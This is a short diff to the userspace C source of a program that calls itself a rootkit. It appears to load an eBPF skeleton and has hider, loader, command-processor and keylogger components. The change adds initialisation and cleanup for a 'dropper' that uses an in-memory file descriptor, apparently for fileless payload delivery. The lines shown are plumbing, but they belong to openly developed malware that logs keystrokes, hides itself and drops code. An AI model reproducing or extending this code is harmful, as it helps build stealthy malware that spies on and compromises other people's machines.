@@ -2,10 +2,10 @@
 
 #include "config.h"
 #include "rootkit.skel.h"
-#include "userspace/rootkit.h"
 #include "userspace/command_processor.h"
 #include "userspace/hider.h"
 #include "userspace/loader.h"
+#include "userspace/rootkit.h"
 
 #define RING_BUFF_POLL_TIMEOUT_MS 100
 
@@ -19,6 +19,8 @@ int rootkit_init(application_context_t *application_ctx, const char *exec_name) 
 
     application_ctx->keylogger_ctx.keylogger_active = false;
     application_ctx->keylogger_ctx.keylogger_socket_fd = -1;
+
+    application_ctx->command_processor_ctx.dropper_ctx.memory_file_fd = -1;
 
     application_ctx->hider_ctx.is_initialized = false;
     application_ctx->loader_ctx.hider_ctx = &application_ctx->hider_ctx;
@@ -88,6 +90,8 @@ void rootkit_cleanup(application_context_t *application_ctx) {
     }
 
     keylogger_processor_cleanup(&application_ctx->keylogger_ctx);
+
+    dropper_cleanup(&application_ctx->command_processor_ctx.dropper_ctx);
 
     if (application_ctx->skel) {
         loader_unload_rootkit(application_ctx->skel);
